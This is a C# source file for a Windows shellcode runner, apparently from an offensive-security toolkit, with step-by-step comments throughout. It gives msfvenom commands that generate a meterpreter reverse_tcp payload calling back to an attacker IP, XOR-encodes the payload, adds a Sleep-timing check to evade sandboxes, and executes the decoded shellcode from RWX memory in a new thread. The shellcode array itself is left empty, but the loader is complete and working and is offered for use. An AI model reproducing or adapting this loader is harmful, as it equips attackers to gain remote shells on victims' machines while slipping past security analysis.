// ============================================================
// Simple Shellcode Runner (XOR Encoded)
// ============================================================
// WHAT THIS DOES:
//   The most basic shellcode runner. Allocates RWX memory in the
//   CURRENT process, XOR-decodes the embedded shellcode, copies
//   it to that memory, then creates a thread to execute it.
//
//   This is the building block for all other loaders — understand
//   this one and the rest make sense.
//
// WHEN TO USE:
//   - No restrictions on execution (no AppLocker, no Defender)
//   - Testing/development of new payloads
//   - When you just need it to work, not stealthy
//
// LIMITATIONS:
//   - Runs in its own process (runner.exe) — kills session if process dies
//   - RWX memory is flagged by some EDRs (obvious sign of shellcode)
//   - XOR encoding is weak (known signatures exist for key=0xfa)
//
// HOW TO CUSTOMIZE:
//   1. Generate: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f csharp
//   2. XOR encode: python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa --format csharp
//   3. Replace 'buf' array below
//   4. Compile: csc.exe /unsafe /platform:x64 /out:runner.exe simple-runner.cs
//   5. Run: .\runner.exe
//
// SANDBOX EVASION:
//   Sleep + time check — sandboxes often accelerate Sleep().
//   If real time elapsed < 9.5 seconds, we're in a sandbox.
// ============================================================

using System.Runtime.InteropServices;
using System;

namespace rev
{
    public class Program
    {
        // -------------------------------------------------------
        // Memory protection constants
        // -------------------------------------------------------

        // PAGE_EXECUTE_READWRITE (0x40): Memory can be read, written, AND executed.
        // This is required to write shellcode then execute it in the same region.
        // Note: Modern EDRs flag RWX allocations — more sophisticated loaders
        // use RW → copy shellcode → change to RX before executing.
        public const uint EXECUTEREADWRITE = 0x40;

        // MEM_COMMIT | MEM_RESERVE (0x3000):
        //   MEM_RESERVE (0x2000): reserves a range of virtual address space
        //   MEM_COMMIT  (0x1000): allocates physical memory for reserved pages
        //   Combined (0x3000): reserve AND commit in one call
        public const uint COMMIT_RESERVE = 0x3000;

        // -------------------------------------------------------
        // Win32 API imports
        // -------------------------------------------------------

        // Sleep: Pause execution for a given number of milliseconds.
        // We use this for sandbox evasion (sandboxes often skip/accelerate Sleep).
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // VirtualAlloc: Allocate a region of memory in the current process.
        // Parameters:
        //   lpAddress (IntPtr.Zero)    = let OS choose the address
        //   dwSize                      = size of shellcode in bytes
        //   flAllocationType (0x3000)   = MEM_COMMIT | MEM_RESERVE
        //   flProtect (0x40)            = PAGE_EXECUTE_READWRITE
        // Returns: address of the allocated memory region
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        // CreateThread: Create a new thread in the current process.
        // Parameters:
        //   lpThreadAttributes (IntPtr.Zero) = default security descriptor
        //   dwStackSize (0)                   = default stack size
        //   lpStartAddress                    = where the thread starts executing (our shellcode!)
        //   lpParameter (IntPtr.Zero)         = no parameter passed to thread function
        //   dwCreationFlags (0)               = thread runs immediately
        //   lpThreadId (0)                    = we don't care about the thread ID
        // Returns: handle to the new thread
        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        // WaitForSingleObject: Block until a thread or object completes.
        // We pass -1 (INFINITE) as the wait time — block forever.
        // This prevents the process from exiting before shellcode completes.
        // If we didn't call this, main() would return and process would exit,
        // killing our meterpreter session.
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        public static void Main()
        {
            // -------------------------------------------------------
            // SANDBOX EVASION: Sleep timing check
            // -------------------------------------------------------
            // Record time BEFORE sleep
            DateTime t1 = DateTime.Now;

            // Sleep for 10 seconds. Sandboxes often either:
            //   a) Skip the Sleep() call entirely
            //   b) Accelerate time to avoid waiting
            Sleep(10000);  // 10,000ms = 10 seconds

            // Measure elapsed time AFTER sleep
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;

            // If less than 9.5 seconds passed, Sleep() was faked → sandbox detected.
            // Exit without executing shellcode (sandbox won't see any malicious behavior).
            if (deltaT < 9.5)
            {
                return;
            }

            // -------------------------------------------------------
            // SHELLCODE (XOR encoded, key = 0xfa)
            // -------------------------------------------------------
            // Generated by:
            //   msfvenom -p windows/x64/meterpreter/reverse_tcp
            //            LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            // Then XOR'd with key 0xfa using the XOR encoder.
            //
            // The XOR encoding hides the shellcode signature.
            // When run, we XOR each byte back to get the original shellcode.
            //
            // REPLACE this array with your encoded shellcode for your actual IP/port.
            byte[] buf = new byte[511] {
            
            };

            // -------------------------------------------------------
            // ALLOCATE RWX MEMORY in the current process
            // -------------------------------------------------------
            int payloadSize = buf.Length;  // 511 bytes for this example

            // Allocate RWX memory region. We need:
            //   - WRITABLE to copy shellcode in
            //   - EXECUTABLE to run the shellcode
            //   - Setting both at once (RWX) is simpler but more detectable
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);

            // -------------------------------------------------------
            // XOR DECODE the shellcode
            // -------------------------------------------------------
            // Each byte was XOR'd with 0xfa when encoding.
            // XOR with the same key again restores the original bytes.
            // (XOR is its own inverse: a ^ k ^ k == a)
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            // -------------------------------------------------------
            // COPY shellcode to the allocated memory
            // -------------------------------------------------------
            // Marshal.Copy: managed → unmanaged memory copy
            // Copies all bytes from buf[] to the address payAddr
            Marshal.Copy(buf, 0, payAddr, payloadSize);

            // -------------------------------------------------------
            // EXECUTE shellcode by creating a new thread
            // -------------------------------------------------------
            // CreateThread(NULL, 0, payAddr, NULL, 0, 0):
            //   Thread starts executing at 'payAddr' (our shellcode)
            //   The shellcode will establish our meterpreter session
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);

            // Wait indefinitely for the thread to complete.
            // Without this, Main() returns → process exits → meterpreter dies.
            // -1 = INFINITE timeout
            int waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}
